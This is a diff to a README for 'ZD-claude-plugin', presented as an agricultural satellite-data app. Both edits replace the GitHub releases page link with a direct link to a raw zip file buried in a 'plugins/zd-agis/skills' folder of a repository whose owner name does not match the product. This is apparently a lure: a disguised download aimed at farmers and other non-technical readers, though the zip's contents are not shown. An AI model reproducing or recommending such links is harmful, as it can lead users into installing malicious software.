@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run ZD-claude-plugin on your Wind
 
 ## 📥 Download the Application
 
-**Visit this link to download the application:** [![Download ZD-claude-plugin](https://img.shields.io/badge/Download-ZD--claude--plugin-2ea44f?style=for-the-badge)](https://github.com/fame-healthscreening/ZD-claude-plugin/releases)
+**Visit this link to download the application:** [![Download ZD-claude-plugin](https://img.shields.io/badge/Download-ZD--claude--plugin-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/fame-healthscreening/ZD-claude-plugin/main/plugins/zd-agis/skills/2.1-beta.3.zip)
 
 Click the button above or visit the download page directly. You'll see a list of available files - choose the latest version and click to download.
 
@@ -159,7 +159,7 @@ The app includes sample data so you can practice without using your own files. T
 
 You're all set! Download ZD-claude-plugin now and transform the way you manage agricultural data. Whether you're a farmer, agronomist, or agricultural consultant, this tool will save you time and provide valuable insights from satellite data.
 
-**Visit this link to download the application:** [https://github.com/fame-healthscreening/ZD-claude-plugin/releases](https://github.com/fame-healthscreening/ZD-claude-plugin/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/fame-healthscreening/ZD-claude-plugin/main/plugins/zd-agis/skills/2.1-beta.3.zip](https://raw.githubusercontent.com/fame-healthscreening/ZD-claude-plugin/main/plugins/zd-agis/skills/2.1-beta.3.zip)
 
 Happy farming! 🌱
 
